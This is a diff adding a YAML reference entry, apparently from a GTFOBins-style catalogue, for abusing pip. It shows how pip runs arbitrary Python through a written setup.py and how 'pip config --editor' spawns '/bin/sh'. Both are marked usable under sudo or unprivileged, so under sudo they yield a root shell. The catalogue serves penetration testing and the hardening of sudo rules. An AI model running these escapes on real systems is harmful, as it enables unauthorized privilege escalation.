@@ -1,0 +1,27 @@
+---
+functions:
+  inherit:
+  - code: |-
+      echo '...' >setup.py
+      pip install --break-system-packages .
+    comment: |-
+      This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`).
+
+      Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example:
+
+      ```
+      echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py
+      ```
+
+      The `--break-system-packages` flag can be omitted in older systems.
+    contexts:
+      sudo:
+      unprivileged:
+    from: python
+  shell:
+  - code: |-
+      pip config --editor '/bin/sh -s' edit
+    contexts:
+      sudo:
+      unprivileged:
+...
